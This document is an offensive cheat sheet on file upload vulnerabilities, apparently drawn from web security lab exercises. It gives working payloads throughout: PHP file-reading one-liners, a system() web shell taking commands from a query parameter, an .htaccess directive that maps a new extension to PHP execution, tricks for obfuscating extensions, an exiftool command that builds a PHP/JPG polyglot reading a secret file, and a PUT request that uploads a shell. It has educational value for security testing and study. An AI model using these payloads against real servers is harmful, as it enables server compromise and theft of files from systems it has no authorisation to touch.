
## File Upload Vulnerabilities

The following PHP one-liner could be used to read arbitrary files from the server's filesystem:
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

---

A more versatile web shell may look something like this:
```
<?php echo system($_GET['command']); ?>
```
This script enables you to pass an arbitrary system command via a query parameter as follows:
GET /example/exploit.php?command=id HTTP/1.1

---

## Changing Content-Type:
```
.svg  = Content-Type: image/svg+xml
.php  = Content-Type: application/x-httpd-php OR text/x-php OR text/plain OR application/octet-stream
.aspx = Content-Type: application/octet-stream
```
---

## Web shell upload via path traversal

sometimes some file doesn't execute commands so try path traversal and upload our executable file in different folder
in filename type ../ to go one step backward and upload file there, sometimes this doesn't work so you have to do url encode "../"
and upload that file
now open that file in new tab
Remove unwanted url encoding parameter from url go to the path you uploaded 
You will see file will start executing in different path if it is vulnerable

---

## Web shell upload via extension blacklist bypass

Change the value of the filename parameter to .htaccess
Change the value of the Content-Type header to text/plain.
Replace the contents of the file (your PHP payload) with the following Apache directive:
```
AddType application/x-httpd-php .l33t
```
This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already.

Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit.
Change the value of the filename parameter from exploit.php to exploit.l33t. Send the request again and notice that the file was uploaded successfully.

---

## Obfuscating file extensions

malicious.php might be blocked
malicious.pHp might work sometimes
or provide multiple extensions like exploit.php.jpg

Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: exploit.php.

Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. exploit%2Ephp

Add semicolons or URL-encoded null byte characters before the file extension. exploit.asp;.jpg or exploit.asp%00.jpg

Try using multibyte unicode characters : shell%C0%AEphp ..During validation: It doesn’t look like .php But later: %C0%AE gets converted into .  Now it becomes: shell.php

Extension Obfuscation Attack : exploit.p.phphp

---

## Flawed validation of the file's contents

Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

---

## Uploading File using PUT

PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>

Try to checking which headers are supported with this request by sending OPTIONS request with same request
If PUT is supported then obviously try this.
